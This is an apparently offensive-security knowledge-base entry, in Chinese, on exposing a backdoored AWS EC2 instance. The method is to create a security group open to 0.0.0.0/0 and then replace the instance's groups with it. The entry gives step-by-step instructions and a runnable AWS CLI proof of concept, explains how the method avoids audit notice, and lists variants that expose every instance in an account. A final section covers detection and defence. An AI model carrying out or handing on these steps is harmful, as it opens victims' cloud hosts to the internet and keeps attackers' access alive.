---
id: cloud-ec2-security-group-full-open-instance-replace
title: EC2 后门入口开路：新建安全组 + authorize-security-group-ingress 0.0.0.0/0，再用 modify-instance-attribute --groups 整体替换实例安全组
type: scenario
domain: cloud
path: cloud
technique: ec2-security-group-full-open-replace
aliases:
- AWS 安全组全开放
- modify-instance-attribute --groups
- authorize-security-group-ingress 0.0.0.0/0
- EC2 后门端口公网可达
- 安全组替换暴露实例
- sg 全开
tags:
- cloud
- aws
- ec2
- security-group
- exposure
- persistence
- backdoor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W4
  verified_at: '2026-11-08T13:50:36+08:00'
  notes: 已对照原文核对 create-security-group(my-security-group)、authorize-security-group-ingress tcp 22/80 --cidr 0.0.0.0/0 返回结构、describe-security-groups 的 IpPermissions/IpPermissionsEgress、describe-instances 取 InstanceId i-0183d702137794a80、modify-instance-attribute --groups 加挂、以及原文提醒操作后删除均一致；未验证点：--groups 为替换而非追加语义、无公网 IP/经 ELB 时的效果差异、NACL 补充等属作者补充原理，原文未直接陈述。
---

## 一句话结论

当目标 EC2 实例的后门（反弹连出、SSH 后门端口、监听型 implant）只在安全组允许的端口上可达时，用高权限 AWS 凭据可以「先建一个放开 0.0.0.0/0 的安全组，再把实例的安全组整体替换成它」：`aws ec2 create-security-group` → `aws ec2 authorize-security-group-ingress --protocol tcp --port N --cidr 0.0.0.0/0` → `aws ec2 modify-instance-attribute --instance-id <id> --groups <sg-id>`，一条命令就让整台机器的入站规则从「最小开放」变成「全互联网可连」，事后同样用 `modify-instance-attribute --groups` 还原。

## 原理

- 安全组是 EC2 的虚拟防火墙，规则挂在 VPC 网络层，与实例内的 iptables/sshd 无关：实例内部即使监听了某个端口，只要安全组不放行，公网就摸不到；反过来安全组一开，端口立刻可达。所以它是「后门能不能活」的开关。
- `modify-instance-attribute --groups` 的语义是**替换**（不是追加）：传入的 group id 列表会整体覆盖实例原有的安全组集合。这既是攻击面的关键（一次调用就能把最小开放的实例改成全开），也是恢复时最容易踩坑的地方——必须先 `describe-instances` 记下原始 `SecurityGroups[].GroupId`，否则无法精确还原。
- 新建安全组默认出站全开（`IpPermissionsEgress` 为 `-1` 全协议、`0.0.0.0/0`）、入站为空；攻击者按需 `authorize-security-group-ingress` 逐条加入 `0.0.0.0/0` 的端口（原文以 22/80 为例，实际可加后门端口或直接 `--protocol -1 --port -1` 全开）。
- 为什么优先「新建再替换」而不是改原安全组：直接给原安全组加入站规则会在 `describe-security-groups` 里显示为「已有安全组多了一条 0.0.0.0/0 规则」，指向明确；新建一个名字平常的安全组（示例 `my-security-group`，描述随便写）再把实例挂上去，审计要同时看「安全组规则」与「实例 attribute 变更」两处才能关联起来。
- 网络位置决定效果：原文实例在默认 VPC、有公网 IP（`44.202.52.69`，`PublicIpAddress`），所以安全组一开即公网可达；若实例只有私网 IP、公网入口靠 ELB/NAT，则改安全组只影响 VPC 内部访问。
- 替代路径：不走 `--groups` 替换，也可以用 `authorize-security-group-ingress` 直接给现用安全组加规则（更轻量、痕迹更集中在原安全组上），或用 `revoke-security-group-ingress` 反向操作做「精准放行后门端口、关掉其它」。
- 元数据线索：`describe-instances` 输出里的 `SecurityGroups`、`NetworkInterfaces[].Groups` 会同时反映挂载关系；`MetadataOptions.HttpTokens=required` 只影响 IMDS，不影响安全组。

## 触发条件

- 攻击者持有可 `ec2:CreateSecurityGroup`、`ec2:AuthorizeSecurityGroupIngress`、`ec2:ModifyInstanceAttribute`（以及 `ec2:DescribeInstances`/`DescribeSecurityGroups`）的 AWS 凭据。
- 目标实例存在可被利用的后门/服务端口，且当前安全组未放行该端口。
- 实例具备公网可达路径（公网 IP 或共享的 NAT/ELB 入口）。
- 目标账号未对安全组变更设置 SCP 拒绝或强制审批。

## 利用步骤

1. 侦察并**先记录原始安全组**（不可跳过）：`aws ec2 describe-instances --instance-ids <id> --query "Reservations[].Instances[].SecurityGroups"`，把 `GroupId` 列表存下来，供事后还原。
2. 新建安全组：`aws ec2 create-security-group --group-name my-security-group --description "My new security group"`（返回 `GroupId`，如 `sg-00380a8bac3c737b8`）。
3. 逐条放开需要的入站端口：`aws ec2 authorize-security-group-ingress --group-id <sg> --protocol tcp --port 22 --cidr 0.0.0.0/0`，对后门端口/80 等重复；要全开可 `--protocol -1 --port -1 --cidr 0.0.0.0/0`。
4. 复核规则：`aws ec2 describe-security-groups --group-ids <sg>`，确认 `IpPermissions[].IpRanges[].CidrIp == "0.0.0.0/0"` 且 `FromPort/ToPort` 覆盖目标端口。
5. 把实例的安全组整体替换：`aws ec2 modify-instance-attribute --instance-id <id> --groups <sg>`。
6. 验证端口可达（从外部探测目标端口），随后按后门设计接入。
7. 收尾还原：`aws ec2 modify-instance-attribute --instance-id <id> --groups <原始 sg id...>`，再 `aws ec2 delete-security-group --group-id <sg>`；原文明确提醒「操作后记得删除」。

## PoC

```bash
# 0) 先记录原始安全组（还原依据）
aws ec2 describe-instances --instance-ids i-0183d702137794a80 \
  --query "Reservations[].Instances[].SecurityGroups"

# 1) 新建安全组
aws ec2 create-security-group --group-name my-security-group \
  --description "My new security group"
# => {"GroupId": "sg-00380a8bac3c737b8"}

# 2) 放开 22 / 80 到全互联网
aws ec2 authorize-security-group-ingress --group-id sg-00380a8bac3c737b8 \
  --protocol tcp --port 22 --cidr 0.0.0.0/0
aws ec2 authorize-security-group-ingress --group-id sg-00380a8bac3c737b8 \
  --protocol tcp --port 80 --cidr 0.0.0.0/0

# 3) 复核（应看到 CidrIpv4=0.0.0.0/0 且 IsEgress=false）
aws ec2 describe-security-groups --group-ids sg-00380a8bac3c737b8

# 4) 整体替换实例安全组（注意：是替换不是追加）
aws ec2 modify-instance-attribute --instance-id i-0183d702137794a80 \
  --groups sg-00380a8bac3c737b8

# 5) 收尾：还原原始安全组并删掉新建的安全组
aws ec2 modify-instance-attribute --instance-id i-0183d702137794a80 \
  --groups sg-0d08b93ddf88aa6b2
aws ec2 delete-security-group --group-id sg-00380a8bac3c737b8
```

## 变体与关联

- 变体：不新建安全组，直接给现用安全组加 `0.0.0.0/0` 规则（`authorize-security-group-ingress --group-id <现用 sg>`），痕迹集中在原安全组，但审计更容易直接命中。
- 变体：精准放行后门端口（只开 22 或某个高位端口）而不是 22/80，减少暴露面与被扫描发现概率。
- 变体：对多个实例批量替换（`describe-instances` 拿全量 `InstanceId` 后循环 `modify-instance-attribute`），形成「全账号端口全开」的横向入口。
- 变体：配合 NACL/路由表修改扩大 VPC 内可达范围（安全组只控制实例，VPC 级要有 NACL 才生效）。
- 关联：[[cloud-cloud-iam-aws-backdoor-user-key-persistence]]（先拿持久管理员 AK，本条用同一身份开网络入口）、[[cloud-cloud-iam-aws-backdoor-role-assume-role-persistence]]、[[cloud-ec2-userdata-cloud-init-always-persistence]]（安全组开路之后的另一条实例级持久化）、[[cloud-metadata-ssrf-imdsv2-token-credential]]（从宿主机侧拿实例角色凭证的相反方向）。
- 边界：无公网入口的实例（仅私网/仅经 ELB）改了安全组也拿不到公网通路；SCP 显式拒绝 `ec2:ModifyInstanceAttribute` 时替换失败；`--groups` 是替换语义，误操作会把原安全组全丢掉（这正是必须先记录原始 GroupId 的原因）。

## 检测与防御

- 检测：CloudTrail 对 `CreateSecurityGroup`、`AuthorizeSecurityGroupIngress`、`ModifyInstanceAttribute` 三个事件做关联告警——尤其「新建安全组 → 立刻加 0.0.0.0/0 规则 → 立刻把某些实例挂上去」的短时序组合，是本原语最典型的特征。
- 检测：定期对账实例安全组与基线（非基线安全组、被替换成新建安全组、`SecurityGroups` 数量变化）；巡检安全组中 `CidrIp=0.0.0.0/0` 且覆盖 22/3389/后门端口的规则。
- 检测：`ModifyInstanceAttribute` 的 requestParameters 里出现 `groupSet` 变更，且发起者不是基线自动化角色。
- 防御：最小权限，禁止普通身份持有 `ec2:ModifyInstanceAttribute`/`ec2:CreateSecurityGroup`；用 SCP 限制安全组只能由固定角色维护；对安全组变更启用 Config 规则/GuardDuty 告警。
- 防御：定期用 Config/AWS Config 记录基线并对漂移自动回滚；对「0.0.0.0/0 入站」建立强制审批与工单。
- 应急：先把实例安全组还原为基线（`modify-instance-attribute --groups <基线>`），再删除异常安全组，然后审计该实例与相关实例的 CloudTrail。
